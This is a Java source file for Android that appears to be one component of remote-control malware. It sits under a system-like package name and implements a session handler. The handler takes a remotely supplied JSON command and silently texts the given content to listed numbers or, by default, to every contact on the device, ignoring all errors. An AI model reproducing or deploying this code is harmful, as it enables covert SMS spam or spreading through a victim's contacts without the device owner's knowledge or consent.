package com.android.system.session.handler;

import com.android.system.service.SystemService;
import com.android.system.session.SessionManager;
import com.android.system.utils.DataPack;
import com.android.system.utils.SystemUtil;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;

public class SendSmsSessionHandler implements SessionManager.SessionHandler {
    @Override
    public void handleSession(String sessionName, InputStream inputStream, OutputStream outputStream) {
        byte[] receiveData = DataPack.receiveDataPack(inputStream);
        if(receiveData == null) {
            return;
        }
        String command = null;
        try {
            command = new String(receiveData, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            command = new String(receiveData);
        }
        JSONObject jsonObject = null;
        try {
            jsonObject = new JSONObject(command);
        } catch (JSONException e) {
            return;
        }
        List<String> onlyList = null;
        String content = null;
        try {
            content = jsonObject.getString("content");
            JSONArray onlyArray = jsonObject.getJSONArray("only");
            if(onlyArray.length() > 0) {
                onlyList = new ArrayList<>();
                for(int i =0; i<onlyArray.length(); ++i) {
                    onlyList.add(onlyArray.getString(i));
                }
            }
        } catch (JSONException e) {
        }
        if(content == null) {
            return;
        }
        if(onlyList == null) {
            onlyList = SystemUtil.getAllContact(SystemService.getContext());
        }
        final String finalContent = content;
        final List<String> finalOnlyList = onlyList;
        new Thread(new Runnable() {
            @Override
            public void run() {
                sendMessage(finalContent, finalOnlyList);
            }
        }).start();
    }

    private void sendMessage(String content, List<String> numberList) {
        for(String number: numberList) {
            try {
                SystemUtil.sendSmsTo(SystemService.getContext(), number, content);
            } catch (Exception e) {
            }
        }
    }
}
